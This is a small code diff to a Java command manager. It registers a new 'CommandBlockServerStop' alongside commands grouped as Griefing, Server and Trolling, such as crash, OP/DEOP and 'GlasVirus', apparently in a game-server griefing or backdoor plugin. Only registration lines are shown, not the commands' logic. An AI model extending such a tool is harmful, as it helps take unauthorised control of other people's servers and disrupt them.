@@ -26,6 +26,7 @@ package de.Garkolym.Commands;
 import java.util.ArrayList;
 
 import de.Garkolym.Commands.Griefing.CommandUltraCactus;
+import de.Garkolym.Commands.Server.CommandBlockServerStop;
 import de.Garkolym.Commands.Server.CommandCrash;
 import de.Garkolym.Commands.Server.CommandDEOP;
 import de.Garkolym.Commands.Server.CommandOP;
@@ -44,6 +45,7 @@ public class CommandManager {
 		this.getCommandList().add(new CommandOP());
 		this.getCommandList().add(new CommandDEOP());
 		this.getCommandList().add(new CommandCrash());
+		this.getCommandList().add(new CommandBlockServerStop());
 		// Trolling
 		this.getCommandList().add(new CommandKackRegen());
 		this.getCommandList().add(new CommandGlasVirus());
